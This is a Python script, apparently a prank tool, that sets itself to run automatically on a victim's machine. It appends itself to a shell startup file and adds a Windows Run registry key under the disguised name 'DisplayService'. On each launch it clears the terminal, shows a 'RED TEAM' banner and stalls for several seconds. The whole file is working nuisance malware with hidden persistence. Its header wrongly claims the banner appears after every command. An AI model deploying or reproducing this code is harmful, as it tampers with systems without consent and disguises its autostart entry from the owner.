#!/usr/bin/env python3
# redteam_echo.py - "RED TEAM" flashes after EVERY command
# No freeze, just constant humiliation

import os
import sys
import subprocess
import platform

SCRIPT = os.path.abspath(__file__)
DELAY_FILE = os.path.expanduser("~/.rt_delay")
DEFAULT_DELAY = 4  # seconds to show banner in seconds

def get_delay():
    try:
        return max(1, int(open(DELAY_FILE).read().strip()))
    except:
        return DEFAULT_DELAY

RED_TEAM = """
\033[91m
██████╗ ███████╗██████╗     ████████╗███████╗ █████╗ ███╗   ███╗
██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
██████╔╝█████╗  ██████╔╝       ██║   █████╗  ███████║██╔████╔██║
██╔══██╗██╔══╝  ██╔══██╗       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
██║  ██║███████╗██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║
╚═╝  ╚═╝╚══════╝╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
\033[0m
"""

def install():
    # Linux: add to every shell profile
    cmd = f'python3 "{SCRIPT}"\n'
    for rc in ["~/.bashrc", "~/.zshrc", "~/.profile"]:
        rc = os.path.expanduser(rc)
        if os.path.exists(rc):
            with open(rc, "a") as f:
                f.write(f"\n# Red Team was here\n{cmd}")
            break
    # Windows: registry
    if os.name == "nt":
        try:
            import winreg as reg
            key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
            pythonw = sys.executable.replace("python.exe", "pythonw.exe")
            if not os.path.exists(pythonw): pythonw = sys.executable
            reg.SetValueEx(key, "DisplayService", 0, reg.REG_SZ, f'"{pythonw}" "{SCRIPT}"')
            reg.CloseKey(key)
        except: pass

def show_banner():
    os.system("clear" if os.name != "nt" else "cls")
    print(RED_TEAM.center(120))
    time.sleep(get_delay())

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--setup":
        install()
        print("[+] Red Team now haunts every command forever")
        sys.exit(0)

    # This is the magic: we run from .bashrc
    import time
    show_banner()
